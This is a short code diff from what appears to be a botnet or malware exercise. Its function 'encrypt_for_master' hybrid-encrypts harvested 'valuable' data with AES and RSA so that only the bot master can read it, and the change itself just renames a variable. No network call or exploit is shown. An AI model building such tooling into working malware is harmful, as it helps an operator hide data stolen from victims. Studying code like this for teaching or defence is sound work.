@@ -30,18 +30,18 @@ def save_valuable(data):
 def encrypt_for_master(data):
   # Encrypt the file so it can only be read by the bot master
   # Generate a random iv and Key to create AES cipher
-  iv  = Random.get_random_bytes(AES.block_size)
-  key = Random.get_random_bytes(AES.block_size)
-  cipher = AES.new(key, AES.MODE_OFB, iv)
+  iv      = Random.get_random_bytes(AES.block_size)
+  symmkey = Random.get_random_bytes(AES.block_size)
+  cipher  = AES.new(symmkey, AES.MODE_OFB, iv)
 
-  # Encrypt the data using the derived key
+  # Encrypt the data using the derived symmetric key
   data_to_encrypt = ANSI_X923_pad(data, cipher.block_size)
   ciphertext      = cipher.encrypt(data_to_encrypt)
   
   # Use the rsa key to encrypt the symmetric key
   pubkey       = RSA.importKey(pubkey_txt)
   rsa_cipher   = PKCS1_OAEP.new(pubkey)
-  encrypted_key = rsa_cipher.encrypt(key)
+  encrypted_key = rsa_cipher.encrypt(symmkey)
   
   return iv + encrypted_key + ciphertext
 
